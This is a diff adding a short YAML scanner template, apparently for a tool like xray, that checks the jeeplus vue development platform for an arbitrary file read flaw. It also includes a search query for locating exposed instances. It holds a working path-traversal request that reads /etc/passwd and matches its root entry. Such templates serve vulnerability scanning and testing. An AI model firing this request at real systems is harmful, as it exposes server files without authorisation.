@@ -1,0 +1,16 @@
+id: jeeplus-download-anyfileread
+
+info:
+  name: jeeplus download anyfileread
+  author: qwtd
+  severity: high
+  description: |
+    hunter: web.title="jeeplus vue快速开发平台"
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /jeeplus-vue/file/download?uploadPath=../../../../etc/&name=passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
